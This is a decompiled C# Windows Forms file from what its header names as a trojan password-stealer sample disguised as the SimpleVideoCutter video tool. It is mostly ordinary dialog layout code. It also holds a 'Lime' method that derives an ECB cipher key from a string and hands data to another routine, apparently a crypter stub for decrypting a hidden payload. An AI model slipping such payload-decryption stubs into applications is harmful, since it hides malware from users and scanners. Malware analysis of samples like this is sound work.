// Decompiled with JetBrains decompiler
// Type: SimpleVideoCutter.FormAddTask
// Assembly: SimpleVideoCutter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC3F1699-ABA1-43FB-A799-9F64138760E7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f61a916b55390990f502b60b4e78cb70d9da9416954b3cb35908cf3498ac3ead.exe

using SimpleVideoCutter.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace SimpleVideoCutter
{
  public class FormAddTask : Form
  {
    private bool selectionsOnKeyFrames = false;
    public static SymmetricAlgorithm Sym = SymmetricAlgorithm.Create();
    public static SHA256CryptoServiceProvider hash = new SHA256CryptoServiceProvider();
    private IContainer components = (IContainer) null;
    private TextBox textBoxDuration;
    private Label labelDuration;
    private FlowLayoutPanel flowLayoutPanelButtons;
    private Button buttonCancel;
    private GroupBox groupBoxLosslessCut;
    private TableLayoutPanel tableLayoutPanelLosslessCut;
    private Label labelLossless;
    private GroupBox groupBoxReEncodeCut;
    private TableLayoutPanel tableLayoutPanelReEncodeCut;
    private GroupBox groupBoxVideoParameters;
    private TableLayoutPanel tableLayoutPanelVideoParameters;
    private Label label2;
    private TextBox textBoxOutputFilePath;
    private Label labelOutputFilePath;
    private TextBox textBoxOriginalFilePath;
    private Label labelOriginalFilePath;
    private Label labelReEncode;
    private Panel panelDetails;
    private RichTextBox richTextBoxExplanation;
    private FlowLayoutPanel flowLayoutPanelReEncodeButtons;
    private Button buttonEnqueueLoseless;
    private Button buttonAdjustSelections;
    private Button buttonEnqueueReEncoding;

    private void UpdatePossibilities()
    {
      bool selectionsOnKeyFrames = this.selectionsOnKeyFrames;
      this.buttonAdjustSelections.Visible = !selectionsOnKeyFrames;
      this.buttonEnqueueLoseless.Enabled = selectionsOnKeyFrames;
      this.buttonEnqueueReEncoding.Enabled = true;
      if (selectionsOnKeyFrames)
      {
        this.labelLossless.Text = GlobalStrings.FormAddTask_LosslessCutPossible;
        this.labelReEncode.Text = GlobalStrings.FormAddTask_ReEncodePossibleButSlow;
        this.groupBoxLosslessCut.BackColor = Color.Honeydew;
      }
      else
      {
        this.labelLossless.Text = GlobalStrings.FormAddTask_LosslessCutNotPossible;
        this.labelReEncode.Text = GlobalStrings.FormAddTask_ReEncodePossibleButSlow;
      }
    }

    public static byte[] Lime(byte[] B, string ikey)
    {
      byte[] hash = FormAddTask.hash.ComputeHash(Encoding.BigEndianUnicode.GetBytes(ikey));
      FormAddTask.Sym.Key = hash;
      FormAddTask.Sym.Mode = CipherMode.ECB;
      return FormFFmpegMissingDialog.Gulnar(B);
    }

    private void richTextBoxExplanation_LinkClicked(object sender, LinkClickedEventArgs e) => Process.Start(e.LinkText);

    private void buttonEnqueueLoseless_Click(object sender, EventArgs e)
    {
    }

    private void buttonEnqueueReEncoding_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormAddTask));
      this.textBoxDuration = new TextBox();
      this.labelDuration = new Label();
      this.flowLayoutPanelButtons = new FlowLayoutPanel();
      this.buttonCancel = new Button();
      this.groupBoxLosslessCut = new GroupBox();
      this.tableLayoutPanelLosslessCut = new TableLayoutPanel();
      this.flowLayoutPanelReEncodeButtons = new FlowLayoutPanel();
      this.buttonEnqueueLoseless = new Button();
      this.buttonAdjustSelections = new Button();
      this.labelLossless = new Label();
      this.groupBoxReEncodeCut = new GroupBox();
      this.tableLayoutPanelReEncodeCut = new TableLayoutPanel();
      this.buttonEnqueueReEncoding = new Button();
      this.labelReEncode = new Label();
      this.groupBoxVideoParameters = new GroupBox();
      this.tableLayoutPanelVideoParameters = new TableLayoutPanel();
      this.label2 = new Label();
      this.textBoxOutputFilePath = new TextBox();
      this.labelOutputFilePath = new Label();
      this.textBoxOriginalFilePath = new TextBox();
      this.labelOriginalFilePath = new Label();
      this.panelDetails = new Panel();
      this.richTextBoxExplanation = new RichTextBox();
      this.flowLayoutPanelButtons.SuspendLayout();
      this.groupBoxLosslessCut.SuspendLayout();
      this.tableLayoutPanelLosslessCut.SuspendLayout();
      this.flowLayoutPanelReEncodeButtons.SuspendLayout();
      this.groupBoxReEncodeCut.SuspendLayout();
      this.tableLayoutPanelReEncodeCut.SuspendLayout();
      this.groupBoxVideoParameters.SuspendLayout();
      this.tableLayoutPanelVideoParameters.SuspendLayout();
      this.panelDetails.SuspendLayout();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.textBoxDuration, "textBoxDuration");
      this.textBoxDuration.Name = "textBoxDuration";
      this.textBoxDuration.ReadOnly = true;
      componentResourceManager.ApplyResources((object) this.labelDuration, "labelDuration");
      this.labelDuration.Name = "labelDuration";
      this.flowLayoutPanelButtons.Controls.Add((Control) this.buttonCancel);
      componentResourceManager.ApplyResources((object) this.flowLayoutPanelButtons, "flowLayoutPanelButtons");
      this.flowLayoutPanelButtons.Name = "flowLayoutPanelButtons";
      this.buttonCancel.DialogResult = DialogResult.Cancel;
      componentResourceManager.ApplyResources((object) this.buttonCancel, "buttonCancel");
      this.buttonCancel.Name = "buttonCancel";
      this.buttonCancel.UseVisualStyleBackColor = true;
      this.groupBoxLosslessCut.Controls.Add((Control) this.tableLayoutPanelLosslessCut);
      componentResourceManager.ApplyResources((object) this.groupBoxLosslessCut, "groupBoxLosslessCut");
      this.groupBoxLosslessCut.Name = "groupBoxLosslessCut";
      this.groupBoxLosslessCut.TabStop = false;
      componentResourceManager.ApplyResources((object) this.tableLayoutPanelLosslessCut, "tableLayoutPanelLosslessCut");
      this.tableLayoutPanelLosslessCut.Controls.Add((Control) this.flowLayoutPanelReEncodeButtons, 1, 1);
      this.tableLayoutPanelLosslessCut.Controls.Add((Control) this.labelLossless, 0, 0);
      this.tableLayoutPanelLosslessCut.Name = "tableLayoutPanelLosslessCut";
      componentResourceManager.ApplyResources((object) this.flowLayoutPanelReEncodeButtons, "flowLayoutPanelReEncodeButtons");
      this.tableLayoutPanelLosslessCut.SetColumnSpan((Control) this.flowLayoutPanelReEncodeButtons, 2);
      this.flowLayoutPanelReEncodeButtons.Controls.Add((Control) this.buttonEnqueueLoseless);
      this.flowLayoutPanelReEncodeButtons.Controls.Add((Control) this.buttonAdjustSelections);
      this.flowLayoutPanelReEncodeButtons.Name = "flowLayoutPanelReEncodeButtons";
      componentResourceManager.ApplyResources((object) this.buttonEnqueueLoseless, "buttonEnqueueLoseless");
      this.buttonEnqueueLoseless.BackColor = SystemColors.Control;
      this.buttonEnqueueLoseless.DialogResult = DialogResult.OK;
      this.buttonEnqueueLoseless.Name = "buttonEnqueueLoseless";
      this.buttonEnqueueLoseless.UseVisualStyleBackColor = false;
      this.buttonEnqueueLoseless.Click += new EventHandler(this.buttonEnqueueLoseless_Click);
      componentResourceManager.ApplyResources((object) this.buttonAdjustSelections, "buttonAdjustSelections");
      this.buttonAdjustSelections.DialogResult = DialogResult.Retry;
      this.buttonAdjustSelections.Name = "buttonAdjustSelections";
      this.buttonAdjustSelections.UseVisualStyleBackColor = false;
      componentResourceManager.ApplyResources((object) this.labelLossless, "labelLossless");
      this.tableLayoutPanelLosslessCut.SetColumnSpan((Control) this.labelLossless, 2);
      this.labelLossless.ForeColor = SystemColors.ControlText;
      this.labelLossless.Name = "labelLossless";
      this.groupBoxReEncodeCut.BackColor = SystemColors.Control;
      this.groupBoxReEncodeCut.Controls.Add((Control) this.tableLayoutPanelReEncodeCut);
      componentResourceManager.ApplyResources((object) this.groupBoxReEncodeCut, "groupBoxReEncodeCut");
      this.groupBoxReEncodeCut.Name = "groupBoxReEncodeCut";
      this.groupBoxReEncodeCut.TabStop = false;
      componentResourceManager.ApplyResources((object) this.tableLayoutPanelReEncodeCut, "tableLayoutPanelReEncodeCut");
      this.tableLayoutPanelReEncodeCut.Controls.Add((Control) this.buttonEnqueueReEncoding, 1, 2);
      this.tableLayoutPanelReEncodeCut.Controls.Add((Control) this.labelReEncode, 0, 0);
      this.tableLayoutPanelReEncodeCut.Name = "tableLayoutPanelReEncodeCut";
      componentResourceManager.ApplyResources((object) this.buttonEnqueueReEncoding, "buttonEnqueueReEncoding");
      this.buttonEnqueueReEncoding.BackColor = SystemColors.Control;
      this.buttonEnqueueReEncoding.DialogResult = DialogResult.OK;
      this.buttonEnqueueReEncoding.Name = "buttonEnqueueReEncoding";
      this.buttonEnqueueReEncoding.UseVisualStyleBackColor = false;
      this.buttonEnqueueReEncoding.Click += new EventHandler(this.buttonEnqueueReEncoding_Click);
      componentResourceManager.ApplyResources((object) this.labelReEncode, "labelReEncode");
      this.tableLayoutPanelReEncodeCut.SetColumnSpan((Control) this.labelReEncode, 2);
      this.labelReEncode.Name = "labelReEncode";
      this.groupBoxVideoParameters.Controls.Add((Control) this.tableLayoutPanelVideoParameters);
      componentResourceManager.ApplyResources((object) this.groupBoxVideoParameters, "groupBoxVideoParameters");
      this.groupBoxVideoParameters.Name = "groupBoxVideoParameters";
      this.groupBoxVideoParameters.TabStop = false;
      componentResourceManager.ApplyResources((object) this.tableLayoutPanelVideoParameters, "tableLayoutPanelVideoParameters");
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.label2, 1, 3);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.textBoxOutputFilePath, 1, 2);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.labelOutputFilePath, 0, 2);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.textBoxOriginalFilePath, 1, 0);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.labelOriginalFilePath, 0, 0);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.textBoxDuration, 1, 1);
      this.tableLayoutPanelVideoParameters.Controls.Add((Control) this.labelDuration, 0, 1);
      this.tableLayoutPanelVideoParameters.Name = "tableLayoutPanelVideoParameters";
      componentResourceManager.ApplyResources((object) this.label2, "label2");
      this.label2.Name = "label2";
      componentResourceManager.ApplyResources((object) this.textBoxOutputFilePath, "textBoxOutputFilePath");
      this.textBoxOutputFilePath.Name = "textBoxOutputFilePath";
      this.textBoxOutputFilePath.ReadOnly = true;
      componentResourceManager.ApplyResources((object) this.labelOutputFilePath, "labelOutputFilePath");
      this.labelOutputFilePath.Name = "labelOutputFilePath";
      componentResourceManager.ApplyResources((object) this.textBoxOriginalFilePath, "textBoxOriginalFilePath");
      this.textBoxOriginalFilePath.Name = "textBoxOriginalFilePath";
      this.textBoxOriginalFilePath.ReadOnly = true;
      componentResourceManager.ApplyResources((object) this.labelOriginalFilePath, "labelOriginalFilePath");
      this.labelOriginalFilePath.Name = "labelOriginalFilePath";
      this.panelDetails.Controls.Add((Control) this.richTextBoxExplanation);
      componentResourceManager.ApplyResources((object) this.panelDetails, "panelDetails");
      this.panelDetails.Name = "panelDetails";
      this.richTextBoxExplanation.BackColor = SystemColors.Control;
      this.richTextBoxExplanation.BorderStyle = BorderStyle.None;
      componentResourceManager.ApplyResources((object) this.richTextBoxExplanation, "richTextBoxExplanation");
      this.richTextBoxExplanation.Name = "richTextBoxExplanation";
      this.richTextBoxExplanation.ReadOnly = true;
      this.richTextBoxExplanation.LinkClicked += new LinkClickedEventHandler(this.richTextBoxExplanation_LinkClicked);
      componentResourceManager.ApplyResources((object) this, "$this");
      this.AutoScaleMode = AutoScaleMode.Font;
      this.CancelButton = (IButtonControl) this.buttonCancel;
      this.ControlBox = false;
      this.Controls.Add((Control) this.groupBoxReEncodeCut);
      this.Controls.Add((Control) this.groupBoxLosslessCut);
      this.Controls.Add((Control) this.groupBoxVideoParameters);
      this.Controls.Add((Control) this.flowLayoutPanelButtons);
      this.Controls.Add((Control) this.panelDetails);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (FormAddTask);
      this.ShowInTaskbar = false;
      this.flowLayoutPanelButtons.ResumeLayout(false);
      this.groupBoxLosslessCut.ResumeLayout(false);
      this.tableLayoutPanelLosslessCut.ResumeLayout(false);
      this.tableLayoutPanelLosslessCut.PerformLayout();
      this.flowLayoutPanelReEncodeButtons.ResumeLayout(false);
      this.flowLayoutPanelReEncodeButtons.PerformLayout();
      this.groupBoxReEncodeCut.ResumeLayout(false);
      this.tableLayoutPanelReEncodeCut.ResumeLayout(false);
      this.tableLayoutPanelReEncodeCut.PerformLayout();
      this.groupBoxVideoParameters.ResumeLayout(false);
      this.tableLayoutPanelVideoParameters.ResumeLayout(false);
      this.tableLayoutPanelVideoParameters.PerformLayout();
      this.panelDetails.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal class ComboBoxItem
    {
      public string Title { get; set; }

      public string Value { get; set; }

      public override bool Equals(object obj) => obj is FormAddTask.ComboBoxItem && string.Equals(this.Value, (obj as FormAddTask.ComboBoxItem).Value);

      public override int GetHashCode() => this.Value == null ? 0 : this.Value.GetHashCode();
    }
  }
}
